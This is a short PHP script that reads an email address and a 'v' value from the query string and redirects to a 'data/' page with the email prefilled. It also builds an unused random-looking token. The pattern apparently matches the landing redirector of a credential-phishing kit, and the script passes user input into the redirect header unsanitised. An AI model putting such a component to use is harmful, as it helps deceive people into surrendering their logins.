<?php
function random_number() {
	$numbers = array( 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 'A', 'b', 'C', 'D', 'e', 'F', 'G', 'H', 'i', 'J', 'K', 'L' );
	$key = array_rand( $numbers );
	return $numbers[ $key ];
}
if ( isset( $_GET[ 'Email' ] ) ) {
	$Email = $_GET[ 'Email' ];
}
if ( isset( $_GET[ 'email' ] ) ) {
	$Email = $_GET[ 'email' ];
}

if ( isset( $_GET[ 'v' ] ) ) {
	$v = $_GET[ 'v' ];
}

$url = random_number() . random_number() . random_number() . random_number() . random_number() . random_number() . date( 'U' ) . md5( date( 'U' ) ) . md5( date( 'U' ) ) . md5( date( 'U' ) ) . md5( date( 'U' ) ) . md5( date( 'U' ) );
header( "location: data/?Email=$Email&v=$v" );
?>